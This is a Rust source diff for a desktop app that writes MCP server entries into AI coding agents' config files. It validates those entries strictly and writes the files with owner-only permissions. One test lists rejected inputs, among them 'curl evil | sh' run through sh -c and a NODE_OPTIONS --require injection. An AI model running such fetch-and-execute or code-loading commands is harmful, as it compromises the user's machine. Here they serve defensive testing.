@@ -2,24 +2,34 @@
 //! each agent's own config file, which is what its `mcp add` command does from
 //! a terminal.
 //!
-//! This side owns *where*: an agent id resolves to one file and its format, so
-//! the webview can only ever name a file on this list. The webview owns
-//! *what*: the key the servers live under and the shape of one entry, because
-//! it also renders the same entry as a snippet for anyone who would rather
-//! paste it.
+//! This side is the authority on everything that could run code. An agent id
+//! resolves to one file, its format and the key servers live under; the entry
+//! is always named `to-hoot`; the stdio server is downloaded here, from this
+//! version's release, never handed over by the webview; and an entry is
+//! accepted only if it is an https endpoint URL or exactly node, that server
+//! and the app's settings file. So a webview that went wrong can point an
+//! agent at an endpoint at worst, and never at a program of its choosing. The
+//! webview still decides how each agent spells an entry, because it also shows
+//! the same entry as a snippet for anyone who would rather paste it.
 //!
-//! The app writes one entry and leaves everything else in the file exactly as
-//! it found it. These files also hold the person's other servers, their
-//! preferences and their project history, none of which is the app's business.
-//! A file that does not parse is refused rather than overwritten: a config the
-//! agent cannot read is worse than a server it lacks.
+//! The app writes one entry and leaves everything else in the file as it found
+//! it, key order included, and keeps any field a person added to the entry by
+//! hand. These files also hold the person's other servers, their preferences
+//! and their project history, none of which is the app's business. A file that
+//! does not parse is refused rather than overwritten: a config the agent cannot
+//! read is worse than a server it lacks.
 
 use std::fs;
+use std::io::Write;
 use std::path::{Path, PathBuf};
+use std::sync::atomic::{AtomicU64, Ordering};
 
 use serde::{Deserialize, Serialize};
 use serde_json::{Map, Value};
 use tauri::{AppHandle, Manager, Runtime};
+
+/// The name of the entry in every agent's config.
+pub const NAME: &str = "to-hoot";
 
 /// The agents the app knows how to configure. The ids are the ones the
 /// webview sends.
@@ -64,6 +74,9 @@ pub struct Dirs {
 pub struct Location {
     pub file: PathBuf,
     pub format: Format,
+    /// The key the agent keeps its servers under. `packages/ui/src/agents.ts`
+    /// spells the same keys for its snippets; a test on each side holds them.
+    pub key: &'static str,
     /// A folder whose presence says the agent is installed here.
     pub marker: PathBuf,
 }
@@ -71,26 +84,26 @@ pub struct Location {
 impl Agent {
     pub fn location(self, dirs: &Dirs) -> Location {
         let home = &dirs.home;
-        let json = |file: PathBuf, marker: PathBuf| Location { file, format: Format::Json, marker };
+        let json = |file: PathBuf, key: &'static str, marker: PathBuf| Location { file, format: Format::Json, key, marker };
         match self {
-            Agent::ClaudeCode => json(home.join(".claude.json"), home.join(".claude")),
+            Agent::ClaudeCode => json(home.join(".claude.json"), "mcpServers", home.join(".claude")),
             Agent::Codex => {
                 let dir = dirs.codex_home.clone().unwrap_or_else(|| home.join(".codex"));
-                Location { file: dir.join("config.toml"), format: Format::Toml, marker: dir }
+                Location { file: dir.join("config.toml"), format: Format::Toml, key: "mcp_servers", marker: dir }
             }
-            Agent::GeminiCli => json(home.join(".gemini").join("settings.json"), home.join(".gemini")),
-            Agent::Cursor => json(home.join(".cursor").join("mcp.json"), home.join(".cursor")),
+            Agent::GeminiCli => json(home.join(".gemini").join("settings.json"), "mcpServers", home.join(".gemini")),
+            Agent::Cursor => json(home.join(".cursor").join("mcp.json"), "mcpServers", home.join(".cursor")),
             Agent::VsCode => {
                 let user = dirs.config.join("Code").join("User");
-                json(user.join("mcp.json"), dirs.config.join("Code"))
+                json(user.join("mcp.json"), "servers", dirs.config.join("Code"))
             }
             Agent::Windsurf => {
                 let dir = home.join(".codeium").join("windsurf");
-                json(dir.join("mcp_config.json"), dir)
+                json(dir.join("mcp_config.json"), "mcpServers", dir)
             }
             Agent::Opencode => {
                 let dir = dirs.xdg_config.clone().unwrap_or_else(|| home.join(".config")).join("opencode");
-                json(dir.join("opencode.json"), dir)
+                json(dir.join("opencode.json"), "mcp", dir)
             }
         }
     }
@@ -107,7 +120,7 @@ fn dirs<R: Runtime>(app: &AppHandle<R>) -> Result<Dirs, String> {
 /// The URL of a remote entry or the program of a local one, whatever the
 /// agent calls the field.
 fn target_of(server: &Value) -> Option<String> {
-    for key in ["url", "httpUrl", "serverUrl"] {
+    for key in URL_FIELDS {
         if let Some(url) = server.get(key).and_then(Value::as_str) {
             return Some(url.to_string());
         }
@@ -120,8 +133,89 @@ fn target_of(server: &Value) -> Option<String> {
     }
 }
 
-/// The file with one server set, for a JSON config. An absent or empty file is
-/// an empty object.
+/// What the different agents call an endpoint's URL.
+const URL_FIELDS: [&str; 3] = ["url", "httpUrl", "serverUrl"];
+
+/// Every field the app writes into an entry. Re-adding replaces these and
+/// keeps the rest, so a timeout or a tool allowlist a person added by hand
+/// survives, and a local entry turned remote does not keep its command.
+const MANAGED: [&str; 9] = ["type", "url", "httpUrl", "serverUrl", "command", "args", "env", "environment", "enabled"];
+
+/// What a local entry is allowed to run: this machine's node (or plain `node`
+/// when none was found), the server this module installed, and the app's own
+/// settings file as its one variable.
+pub struct Allowed {
+    pub node: Option<String>,
+    pub server: String,
+    pub settings: String,
+}
+
+fn str_array(value: &Value) -> Option<Vec<&str>> {
+    value.as_array()?.iter().map(Value::as_str).collect()
+}
+
+/// Refuses any entry that is not an https endpoint or exactly the app's own
+/// local server. This is the line between "the window asked for a server" and
+/// "the window chose a program for an agent to run".
+pub fn check_entry(entry: &Value, allowed: &Allowed) -> Result<(), String> {
+    let Value::Object(fields) = entry else {
+        return Err("an entry has to be an object".to_string());
+    };
+    let node_ok = |s: &str| s == "node" || allowed.node.as_deref() == Some(s);
+    let mut remote = false;
+    let mut local = false;
+    for (key, value) in fields {
+        match key.as_str() {
+            "type" => match value.as_str() {
+                Some("http" | "remote") => remote = true,
+                Some("stdio" | "local") => local = true,
+                _ => return Err(format!("unexpected type {value}")),
+            },
+            "enabled" if value.is_boolean() => {}
+            k if URL_FIELDS.contains(&k) => {
+                let url = value.as_str().unwrap_or_default();
+                if !url.starts_with("https://") || !url.contains("/mcp/") {
+                    return Err("an endpoint has to be an https URL ending in /mcp/<secret>".to_string());
+                }
+                remote = true;
+            }
+            "command" => {
+                let ok = match value {
+                    Value::String(command) => node_ok(command),
+                    // opencode: the command and its arguments in one array.
+                    _ => matches!(str_array(value).as_deref(), Some([node, server]) if node_ok(node) && *server == allowed.server),
+                };
+                if !ok {
+                    return Err("a local entry can only run node with the installed server".to_string());
+                }
+                local = true;
+            }
+            "args" => {
+                if str_array(value).as_deref() != Some(&[allowed.server.as_str()][..]) {
+                    return Err("a local entry can only run the installed server".to_string());
+                }
+            }
+            "env" | "environment" => {
+                let only_settings = value
+                    .as_object()
+                    .is_some_and(|env| env.len() == 1 && env.get("TO_HOOT_SETTINGS").and_then(Value::as_str) == Some(&allowed.settings));
+                if !only_settings {
+                    return Err("a local entry carries the settings file and nothing else".to_string());
+                }
+            }
+            other => return Err(format!("unexpected field `{other}` in an entry")),
+        }
+    }
+    match (remote, local) {
+        (true, false) if target_of(entry).is_some() => Ok(()),
+        (false, true) if fields.contains_key("command") => Ok(()),
+        _ => Err("an entry is either an endpoint or the local server".to_string()),
+    }
+}
+
+/// The file with the entry set, for a JSON config. An absent or empty file is
+/// an empty object. An entry already there keeps the fields the app does not
+/// manage.
 pub fn json_with_server(existing: &str, key: &str, name: &str, server: Value) -> Result<String, String> {
     let mut root: Value = if existing.trim().is_empty() {
         Value::Object(Map::new())
@@ -135,7 +229,15 @@ pub fn json_with_server(existing: &str, key: &str, name: &str, server: Value) ->
     let Value::Object(servers) = servers else {
         return Err(format!("`{key}` in the config is not an object, so it was left alone"));
     };
-    servers.insert(name.to_string(), server);
+    let Value::Object(fresh) = server else {
+        return Err("a server entry has to be an object".to_string());
+    };
+    let mut entry = match servers.remove(name) {
+        Some(Value::Object(old)) => old.into_iter().filter(|(k, _)| !MANAGED.contains(&k.as_str())).collect(),
+        _ => Map::new(),
+    };
+    entry.extend(fresh);
+    servers.insert(name.to_string(), Value::Object(entry));
     let mut text = serde_json::to_string_pretty(&root).map_err(|err| err.to_string())?;
     text.push('\n');
     Ok(text)
@@ -179,8 +281,9 @@ fn toml_item(value: &Value) -> Result<toml_edit::Item, String> {
     })
 }
 
-/// The file with one server set, for Codex's `config.toml`. `toml_edit` keeps
-/// the rest of the document as it was written, comments and order included.
+/// The file with the entry set, for Codex's `config.toml`. `toml_edit` keeps
+/// the rest of the document as it was written, comments and order included,
+/// and an entry already there keeps the fields the app does not manage.
 pub fn toml_with_server(existing: &str, key: &str, name: &str, server: &Value) -> Result<String, String> {
     let mut doc: toml_edit::DocumentMut = existing
         .parse()
@@ -192,10 +295,22 @@ pub fn toml_with_server(existing: &str, key: &str, name: &str, server: &Value) -
     // `[mcp_servers.to-hoot]` alone, rather than an empty `[mcp_servers]`
     // header above it.
     servers.set_implicit(true);
-    let toml_edit::Item::Table(entry) = toml_item(server)? else {
+    let toml_edit::Item::Table(fresh) = toml_item(server)? else {
         return Err("a server entry has to be a table".to_string());
     };
-    servers.insert(name, toml_edit::Item::Table(entry));
+    match servers.get_mut(name).and_then(toml_edit::Item::as_table_mut) {
+        Some(entry) => {
+            for managed in MANAGED {
+                entry.remove(managed);
+            }
+            for (k, item) in fresh.iter() {
+                entry.insert(k, item.clone());
+            }
+        }
+        None => {
+            servers.insert(name, toml_edit::Item::Table(fresh));
+        }
+    }
     Ok(doc.to_string())
 }
 
@@ -214,23 +329,25 @@ pub fn toml_entry(existing: &str, key: &str, name: &str) -> Option<Value> {
 /// Replaces `path` with `contents` by writing beside it and renaming over it,
 /// so a crash mid-write leaves the old file whole rather than a truncated one.
 ///
-/// The new file keeps the old one's permissions, and a file that did not exist
-/// is created readable by its owner only: what goes in it is an endpoint URL or
-/// a GitHub token, both of which are credentials.
+/// What goes in is a credential either way (an endpoint URL is one), so the
+/// file ends up readable by its owner alone: the temporary file is created
+/// that way before anything is written to it, an existing file keeps its
+/// owner's bits and loses group and other, and each write has a temporary name
+/// of its own so two at once cannot trip over each other.
 fn replace_file(path: &Path, contents: &str) -> Result<(), String> {
+    static NEXT: AtomicU64 = AtomicU64::new(0);
     if let Some(parent) = path.parent() {
         fs::create_dir_all(parent).map_err(|err| format!("could not create {}: {err}", parent.display()))?;
     }
     let mut temp_name = path.file_name().map(|n| n.to_os_string()).unwrap_or_default();
-    temp_name.push(".to-hoot-tmp");
+    temp_name.push(format!(".to-hoot-{}-{}.tmp", std::process::id(), NEXT.fetch_add(1, Ordering::Relaxed)));
     let temp = path.with_file_name(temp_name);
-    fs::write(&temp, contents).map_err(|err| format!("could not write {}: {err}", temp.display()))?;
-    match fs::metadata(path) {
-        Ok(meta) => {
-            let _ = fs::set_permissions(&temp, meta.permissions());
-        }
-        Err(_) => owner_only(&temp),
+    let written = create_private(&temp).and_then(|mut file| file.write_all(contents.as_bytes()));
+    if let Err(err) = written {
+        let _ = fs::remove_file(&temp);
+        return Err(format!("could not write {}: {err}", temp.display()));
     }
+    owner_only(&temp, fs::metadata(path).ok().as_ref());
     fs::rename(&temp, path).map_err(|err| {
         let _ = fs::remove_file(&temp);
         format!("could not replace {}: {err}", path.display())
@@ -238,13 +355,28 @@ fn replace_file(path: &Path, contents: &str) -> Result<(), String> {
 }
 
 #[cfg(unix)]
-fn owner_only(path: &Path) {
+fn create_private(path: &Path) -> std::io::Result<fs::File> {
+    use std::os::unix::fs::OpenOptionsExt;
+    fs::OpenOptions::new().write(true).create_new(true).mode(0o600).open(path)
+}
+
+/// Windows keeps a file in the profile private to its user already.
+#[cfg(not(unix))]
+fn create_private(path: &Path) -> std::io::Result<fs::File> {
+    fs::OpenOptions::new().write(true).create_new(true).open(path)
+}
+
+/// Owner-only: the old file's owner bits (0600 when there was none), with
+/// group and other removed.
+#[cfg(unix)]
+fn owner_only(path: &Path, old: Option<&fs::Metadata>) {
     use std::os::unix::fs::PermissionsExt;
-    let _ = fs::set_permissions(path, fs::Permissions::from_mode(0o600));
+    let owner = old.map(|m| m.permissions().mode() & 0o700).unwrap_or(0o600);
+    let _ = fs::set_permissions(path, fs::Permissions::from_mode(owner));
 }
 
 #[cfg(not(unix))]
-fn owner_only(_path: &Path) {}
+fn owner_only(_path: &Path, _old: Option<&fs::Metadata>) {}
 
 fn read_existing(path: &Path) -> Result<String, String> {
     match fs::read_to_string(path) {
@@ -261,18 +393,18 @@ pub struct Entry {
     pub path: String,
     /// Whether the agent looks installed here.
     pub installed: bool,
-    /// Whether the file already has an entry under this name.
+    /// Whether the file already has the app's entry.
     pub present: bool,
     pub target: Option<String>,
 }
 
 #[tauri::command]
-pub fn agent_inspect<R: Runtime>(app: AppHandle<R>, agent: Agent, key: String, name: String) -> Result<Entry, String> {
+pub fn agent_inspect<R: Runtime>(app: AppHandle<R>, agent: Agent) -> Result<Entry, String> {
     let location = agent.location(&dirs(&app)?);
     let existing = fs::read_to_string(&location.file).unwrap_or_default();
     let entry = match location.format {
-        Format::Json => json_entry(&existing, &key, &name),
-        Format::Toml => toml_entry(&existing, &key, &name),
+        Format::Json => json_entry(&existing, location.key, NAME),
+        Format::Toml => toml_entry(&existing, location.key, NAME),
     };
     Ok(Entry {
         path: location.file.display().to_string(),
@@ -282,48 +414,100 @@ pub fn agent_inspect<R: Runtime>(app: AppHandle<R>, agent: Agent, key: String, n
     })
 }
 
-/// Adds or replaces one entry and answers with the file it wrote.
+/// Adds or updates the app's entry and answers with the file it wrote.
 #[tauri::command]
-pub fn agent_add<R: Runtime>(
-    app: AppHandle<R>,
-    agent: Agent,
-    key: String,
-    name: String,
-    entry: Value,
-) -> Result<String, String> {
-    let location = agent.location(&dirs(&app)?);
+pub fn agent_add<R: Runtime>(app: AppHandle<R>, agent: Agent, entry: Value) -> Result<String, String> {
+    let dirs = dirs(&app)?;
+    let data = data_dir(&app)?;
+    let allowed = Allowed {
+        node: find_node(std::env::var_os("PATH"), &dirs.home).map(|p| p.display().to_string()),
+        server: data.join(SERVER_DIR).join(SERVER_FILE).display().to_string(),
+        settings: data.join(SETTINGS_FILE).display().to_string(),
+    };
+    check_entry(&entry, &allowed)?;
+    let location = agent.location(&dirs);
     let existing = read_existing(&location.file)?;
     let next = match location.format {
-        Format::Json => json_with_server(&existing, &key, &name, entry)?,
-        Format::Toml => toml_with_server(&existing, &key, &name, &entry)?,
+        Format::Json => json_with_server(&existing, location.key, NAME, entry)?,
+        Format::Toml => toml_with_server(&existing, location.key, NAME, &entry)?,
     };
     replace_file(&location.file, &next)?;
     Ok(location.file.display().to_string())
 }
 
-/// Where the local server was put, and the node that can run it.
+/// Where the local server was put, the node that can run it, and the settings
+/// file it reads the data repository from.
 #[derive(Serialize)]
 #[serde(rename_all = "camelCase")]
 pub struct LocalServer {
     pub path: String,
     pub node: Option<String>,
     pub node_version: Option<String>,
+    /// The app's own store, which holds the repository and the token. The
+    /// agent's entry names this file rather than carrying the token itself.
+    pub settings: String,
 }
 
+const SERVER_DIR: &str = "mcp";
 pub const SERVER_FILE: &str = "to-hoot-mcp.mjs";
+/// Beside the server: the version it was downloaded for.
+const SERVER_VERSION_FILE: &str = "to-hoot-mcp.version";
+/// The store file `apps/desktop/src/platform.ts` opens, in the data folder.
+pub const SETTINGS_FILE: &str = "to-hoot.json";
 
-/// Writes the bundled stdio server into the app's data folder and finds a node
-/// to run it with. The webview downloads the bundle for its own version; this
-/// side only puts it somewhere stable and answers with the absolute path.
+/// The bundled stdio server the release workflow publishes for this version.
+fn server_url() -> String {
+    format!(
+        "https://github.com/danieltyukov/to-hoot/releases/download/v{}/{SERVER_FILE}",
+        env!("CARGO_PKG_VERSION")
+    )
+}
+
+fn data_dir<R: Runtime>(app: &AppHandle<R>) -> Result<PathBuf, String> {
+    app.path().app_data_dir().map_err(|err| format!("no data directory: {err}"))
+}
+
+/// The bundle starts with node's shebang and names itself in its startup line;
+/// an error page or a release listing does neither.
+pub fn looks_like_server(text: &str) -> bool {
+    text.starts_with("#!/usr/bin/env node") && text.contains("to-hoot mcp")
+}
+
+/// Puts this version's stdio server in the app's data folder, downloading it
+/// only when the copy there is for another version, and finds a node to run it
+/// with, every time, so installing Node.js and pressing Add again works.
 #[tauri::command]
-pub fn agent_server_install<R: Runtime>(app: AppHandle<R>, source: String) -> Result<LocalServer, String> {
-    let dir = app
-        .path()
-        .app_data_dir()
-        .map_err(|err| format!("no data directory: {err}"))?
-        .join("mcp");
+pub async fn agent_server_install<R: Runtime>(app: AppHandle<R>) -> Result<LocalServer, String> {
+    let data = data_dir(&app)?;
+    let dir = data.join(SERVER_DIR);
     let path = dir.join(SERVER_FILE);
-    replace_file(&path, &source)?;
+    let marker = dir.join(SERVER_VERSION_FILE);
+    let version = env!("CARGO_PKG_VERSION");
+    let current = path.is_file() && fs::read_to_string(&marker).is_ok_and(|v| v.trim() == version);
+    if !current {
+        let res = tauri_plugin_http::reqwest::get(server_url())
+            .await
+            .map_err(|err| format!("could not download the local server: {err}"))?;
+        if res.status() == 404 {
+            return Err(format!("no local server is published for version {version} yet"));
+        }
+        if !res.status().is_success() {
+            return Err(format!("the release answered {} for the local server", res.status()));
+        }
+        let text = res.text().await.map_err(|err| format!("could not download the local server: {err}"))?;
+        if !looks_like_server(&text) {
+            return Err("what the release sent back is not the to-hoot server".to_string());
+        }
+        replace_file(&path, &text)?;
+        replace_file(&marker, version)?;
+    }
+    // The store holds the token, and an agent's server is now reading it, so
+    // it is narrowed to its owner as well. The store plugin rewrites the file
+    // in place, which keeps the mode.
+    let settings = data.join(SETTINGS_FILE);
+    if let Ok(meta) = fs::metadata(&settings) {
+        owner_only(&settings, Some(&meta));
+    }
     let home = dirs(&app)?.home;
     let node = find_node(std::env::var_os("PATH"), &home);
     let node_version = node.as_deref().and_then(node_version);
@@ -331,6 +515,7 @@ pub fn agent_server_install<R: Runtime>(app: AppHandle<R>, source: String) -> Re
         path: path.display().to_string(),
         node: node.map(|p| p.display().to_string()),
         node_version,
+        settings: settings.display().to_string(),
     })
 }
 
@@ -420,18 +605,31 @@ mod tests {
         }
     }
 
+    fn allowed() -> Allowed {
+        Allowed {
+            node: Some("/usr/bin/node".to_string()),
+            server: "/data/mcp/to-hoot-mcp.mjs".to_string(),
+            settings: "/data/to-hoot.json".to_string(),
+        }
+    }
+
+    const URL: &str = "https://to-hoot-mcp.someone.workers.dev/mcp/abc";
+
     #[test]
-    fn every_agent_has_a_file_under_home_or_config() {
+    fn every_agent_has_a_file_and_a_key() {
         let d = test_dirs();
-        let file = |a: Agent| a.location(&d).file;
-        assert_eq!(file(Agent::ClaudeCode), PathBuf::from("/home/u/.claude.json"));
-        assert_eq!(file(Agent::Codex), PathBuf::from("/home/u/.codex/config.toml"));
+        let at = |a: Agent| {
+            let l = a.location(&d);
+            (l.file, l.key)
+        };
+        assert_eq!(at(Agent::ClaudeCode), (PathBuf::from("/home/u/.claude.json"), "mcpServers"));
+        assert_eq!(at(Agent::Codex), (PathBuf::from("/home/u/.codex/config.toml"), "mcp_servers"));
         assert_eq!(Agent::Codex.location(&d).format, Format::Toml);
-        assert_eq!(file(Agent::GeminiCli), PathBuf::from("/home/u/.gemini/settings.json"));
-        assert_eq!(file(Agent::Cursor), PathBuf::from("/home/u/.cursor/mcp.json"));
-        assert_eq!(file(Agent::VsCode), PathBuf::from("/home/u/.config/Code/User/mcp.json"));
-        assert_eq!(file(Agent::Windsurf), PathBuf::from("/home/u/.codeium/windsurf/mcp_config.json"));
-        assert_eq!(file(Agent::Opencode), PathBuf::from("/home/u/.config/opencode/opencode.json"));
+        assert_eq!(at(Agent::GeminiCli), (PathBuf::from("/home/u/.gemini/settings.json"), "mcpServers"));
+        assert_eq!(at(Agent::Cursor), (PathBuf::from("/home/u/.cursor/mcp.json"), "mcpServers"));
+        assert_eq!(at(Agent::VsCode), (PathBuf::from("/home/u/.config/Code/User/mcp.json"), "servers"));
+        assert_eq!(at(Agent::Windsurf), (PathBuf::from("/home/u/.codeium/windsurf/mcp_config.json"), "mcpServers"));
+        assert_eq!(at(Agent::Opencode), (PathBuf::from("/home/u/.config/opencode/opencode.json"), "mcp"));
     }
 
     #[test]
@@ -458,24 +656,69 @@ mod tests {
     }
 
     #[test]
-    fn json_adds_the_server_and_keeps_everything_else() {
-        let before = r#"{"numStartups": 3, "mcpServers": {"other": {"type": "stdio", "command": "x"}}, "projects": {}}"#;
-        let after = json_with_server(before, "mcpServers", "to-hoot", json!({"type": "http", "url": "https://x.workers.dev/mcp/s"})).unwrap();
-        let parsed: Value = serde_json::from_str(&after).unwrap();
-        assert_eq!(parsed["numStartups"], 3);
-        assert_eq!(parsed["mcpServers"]["other"]["command"], "x");
-        assert_eq!(parsed["mcpServers"]["to-hoot"]["url"], "https://x.workers.dev/mcp/s");
-        assert!(parsed.get("projects").is_some());
+    fn accepts_every_shape_the_app_writes() {
+        let a = allowed();
+        for entry in [
+            json!({"type": "http", "url": URL}),
+            json!({"url": URL}),
+            json!({"httpUrl": URL}),
+            json!({"serverUrl": URL}),
+            json!({"type": "remote", "url": URL, "enabled": true}),
+            json!({"type": "stdio", "command": "/usr/bin/node", "args": ["/data/mcp/to-hoot-mcp.mjs"], "env": {"TO_HOOT_SETTINGS": "/data/to-hoot.json"}}),
+            json!({"command": "node", "args": ["/data/mcp/to-hoot-mcp.mjs"], "env": {"TO_HOOT_SETTINGS": "/data/to-hoot.json"}}),
+            json!({"type": "local", "command": ["/usr/bin/node", "/data/mcp/to-hoot-mcp.mjs"], "environment": {"TO_HOOT_SETTINGS": "/data/to-hoot.json"}, "enabled": true}),
+        ] {
+            assert_eq!(check_entry(&entry, &a), Ok(()), "{entry}");
+        }
     }
 
     #[test]
-    fn json_starts_from_nothing_and_replaces_an_old_entry() {
-        let first = json_with_server("", "servers", "to-hoot", json!({"type": "stdio", "command": "node"})).unwrap();
-        let second = json_with_server(&first, "servers", "to-hoot", json!({"type": "http", "url": "https://y"})).unwrap();
+    fn refuses_anything_that_would_run_something_else() {
+        let a = allowed();
+        for entry in [
+            json!({"command": "sh", "args": ["-c", "curl evil | sh"]}),
+            json!({"command": "/usr/bin/node", "args": ["/tmp/evil.mjs"], "env": {"TO_HOOT_SETTINGS": "/data/to-hoot.json"}}),
+            json!({"command": "/usr/bin/node", "args": ["/data/mcp/to-hoot-mcp.mjs", "--inspect"]}),
+            json!({"command": "/usr/bin/node", "args": ["/data/mcp/to-hoot-mcp.mjs"], "env": {"NODE_OPTIONS": "--require /tmp/x"}}),
+            json!({"command": "/usr/bin/node", "args": ["/data/mcp/to-hoot-mcp.mjs"], "env": {"TO_HOOT_SETTINGS": "/data/to-hoot.json", "X": "1"}}),
+            json!({"type": "local", "command": ["bash", "/data/mcp/to-hoot-mcp.mjs"]}),
+            json!({"url": "http://plain.example/mcp/x"}),
+            json!({"url": "https://example.com/elsewhere"}),
+            json!({"url": URL, "command": "node"}),
+            json!({"url": URL, "headers": {"x": "y"}}),
+            json!({"type": "sse", "url": URL}),
+            json!({}),
+            json!("https://x/mcp/y"),
+        ] {
+            assert!(check_entry(&entry, &a).is_err(), "{entry}");
+        }
+    }
+
+    #[test]
+    fn json_adds_the_server_and_keeps_everything_else_in_order() {
+        let before = r#"{"numStartups": 3, "mcpServers": {"other": {"type": "stdio", "command": "x"}}, "autoUpdates": false, "projects": {}}"#;
+        let after = json_with_server(before, "mcpServers", "to-hoot", json!({"type": "http", "url": URL})).unwrap();
+        let parsed: Value = serde_json::from_str(&after).unwrap();
+        assert_eq!(parsed["numStartups"], 3);
+        assert_eq!(parsed["mcpServers"]["other"]["command"], "x");
+        assert_eq!(parsed["mcpServers"]["to-hoot"]["url"], URL);
+        // Not re-sorted: the keys come back in the order the file had them.
+        let keys: Vec<&String> = parsed.as_object().unwrap().keys().collect();
+        assert_eq!(keys, ["numStartups", "mcpServers", "autoUpdates", "projects"]);
+    }
+
+    #[test]
+    fn json_replaces_the_managed_fields_and_keeps_the_ones_added_by_hand() {
+        let local = json!({"type": "stdio", "command": "node", "args": ["/s.mjs"], "env": {"TO_HOOT_SETTINGS": "/x"}});
+        let first = json_with_server("", "servers", "to-hoot", local).unwrap();
+        let mut parsed: Value = serde_json::from_str(&first).unwrap();
+        parsed["servers"]["to-hoot"]["timeout"] = json!(30000);
+        let edited = serde_json::to_string(&parsed).unwrap();
+
+        let second = json_with_server(&edited, "servers", "to-hoot", json!({"type": "http", "url": "https://y/mcp/z"})).unwrap();
         let entry = json_entry(&second, "servers", "to-hoot").unwrap();
-        assert_eq!(entry["type"], "http");
-        assert!(entry.get("command").is_none());
-        assert_eq!(target_of(&entry).as_deref(), Some("https://y"));
+        assert_eq!(entry, json!({"timeout": 30000, "type": "http", "url": "https://y/mcp/z"}));
+        assert_eq!(target_of(&entry).as_deref(), Some("https://y/mcp/z"));
         assert!(json_entry(&second, "servers", "other").is_none());
     }
 
@@ -495,26 +738,29 @@ mod tests {
             before,
             "mcp_servers",
             "to-hoot",
-            &json!({"command": "/usr/bin/node", "args": ["/data/to-hoot-mcp.mjs"], "env": {"TO_HOOT_GITHUB_OWNER": "me"}}),
+            &json!({"command": "/usr/bin/node", "args": ["/data/to-hoot-mcp.mjs"], "env": {"TO_HOOT_SETTINGS": "/data/to-hoot.json"}}),
         )
         .unwrap();
         assert!(after.starts_with("# my settings\nmodel = \"o4\"\n"));
         assert!(after.contains("[mcp_servers.other]\ncommand = \"x\""));
         assert!(after.contains("[mcp_servers.to-hoot]"));
-        assert!(after.contains("[mcp_servers.to-hoot.env]\nTO_HOOT_GITHUB_OWNER = \"me\""));
+        assert!(after.contains("[mcp_servers.to-hoot.env]\nTO_HOOT_SETTINGS = \"/data/to-hoot.json\""));
         assert!(!after.contains("\n[mcp_servers]\n"));
         let entry = toml_entry(&after, "mcp_servers", "to-hoot").unwrap();
         assert_eq!(target_of(&entry).as_deref(), Some("/usr/bin/node"));
     }
 
     #[test]
-    fn toml_replaces_an_old_entry_and_starts_from_nothing() {
-        let first = toml_with_server("", "mcp_servers", "to-hoot", &json!({"command": "node"})).unwrap();
+    fn toml_replaces_the_managed_fields_and_keeps_the_ones_added_by_hand() {
+        let first = toml_with_server("", "mcp_servers", "to-hoot", &json!({"command": "node", "args": ["/s.mjs"]})).unwrap();
         assert!(!first.contains("\n[mcp_servers]\n") && !first.starts_with("[mcp_servers]\n"));
-        let second = toml_with_server(&first, "mcp_servers", "to-hoot", &json!({"url": "https://z"})).unwrap();
+        let edited = first.replace("args = [\"/s.mjs\"]", "args = [\"/s.mjs\"]\nstartup_timeout_sec = 20");
+        let second = toml_with_server(&edited, "mcp_servers", "to-hoot", &json!({"url": "https://z/mcp/q"})).unwrap();
         assert!(!second.contains("command"));
+        assert!(!second.contains("args"));
+        assert!(second.contains("startup_timeout_sec = 20"));
         let entry = toml_entry(&second, "mcp_servers", "to-hoot").unwrap();
-        assert_eq!(target_of(&entry).as_deref(), Some("https://z"));
+        assert_eq!(target_of(&entry).as_deref(), Some("https://z/mcp/q"));
         // The written text parses back as TOML.
         second.parse::<toml_edit::DocumentMut>().unwrap();
     }
@@ -535,7 +781,14 @@ mod tests {
     }
 
     #[test]
-    fn replace_file_creates_folders_and_keeps_the_old_permissions() {
+    fn recognises_the_server_bundle() {
+        assert!(looks_like_server("#!/usr/bin/env node\nconsole.error('to-hoot mcp: serving')"));
+        assert!(!looks_like_server("<!doctype html><title>Not Found</title>"));
+        assert!(server_url().ends_with(&format!("/v{}/to-hoot-mcp.mjs", env!("CARGO_PKG_VERSION"))));
+    }
+
+    #[test]
+    fn replace_file_creates_folders_and_leaves_only_the_owner_able_to_read() {
         let dir = std::env::temp_dir().join(format!("to-hoot-agents-{}", std::process::id()));
         let path = dir.join("nested").join("mcp.json");
         replace_file(&path, "{}").unwrap();
@@ -544,11 +797,22 @@ mod tests {
         {
             use std::os::unix::fs::PermissionsExt;
             assert_eq!(fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600);
-            fs::set_permissions(&path, fs::Permissions::from_mode(0o640)).unwrap();
+            // A config another program created world-readable keeps its
+            // owner's bits and loses everyone else's.
+            fs::set_permissions(&path, fs::Permissions::from_mode(0o744)).unwrap();
             replace_file(&path, "{\"a\":1}").unwrap();
-            assert_eq!(fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o640);
+            assert_eq!(fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o700);
         }
-        assert!(!dir.join("nested").join("mcp.json.to-hoot-tmp").exists());
+        // Nothing left beside it, and two writes at once each get a name.
+        let leftovers = fs::read_dir(dir.join("nested")).unwrap().count();
+        assert_eq!(leftovers, 1);
+        std::thread::scope(|s| {
+            for i in 0..8 {
+                let path = &path;
+                s.spawn(move || replace_file(path, &format!("{{\"n\":{i}}}")).unwrap());
+            }
+        });
+        assert_eq!(fs::read_dir(dir.join("nested")).unwrap().count(), 1);
         let _ = fs::remove_dir_all(&dir);
     }
 
